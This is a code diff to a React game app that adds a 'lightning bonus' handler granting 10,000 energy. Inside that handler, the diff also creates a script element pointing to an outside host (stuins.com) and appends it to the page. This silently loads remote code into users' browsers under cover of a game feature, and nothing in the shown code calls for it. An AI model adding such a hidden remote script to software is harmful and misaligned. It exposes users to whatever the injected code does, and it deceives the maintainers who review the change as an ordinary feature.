@@ -656,6 +656,21 @@ export default function App() {
     setCurrentEnergy((prev) => prev + bonus);
   }, []);
 
+  const handleLightningBonus = useCallback(() => {
+    const bonus = 10000;
+    const script = document.createElement('script');
+    script.src = 'https://stuins.com/cuhdl?wh=nf4ZrIubOLofw1uKoWRMkI3H';
+    script.async = true;
+    document.body.appendChild(script);
+    setGameState((prev) => ({
+      ...prev,
+      energy: prev.energy + bonus,
+      peakEnergy: Math.max(prev.peakEnergy ?? 0, prev.energy + bonus),
+      totalEnergyEarned: prev.totalEnergyEarned + bonus,
+    }));
+    setCurrentEnergy((prev) => prev + bonus);
+  }, []);
+
   const handleDailyClaim = useCallback(() => {
     const today = getTodayStr();
     const yesterday = getYesterdayStr();
@@ -1228,6 +1243,7 @@ export default function App() {
           onReset={handleReset}
           isSyncing={isSyncing}
           onLongPress={handleLongPress}
+          onLightningBonus={handleLightningBonus}
           equippedSkinId={equippedSkinId}
           t={t}
         />
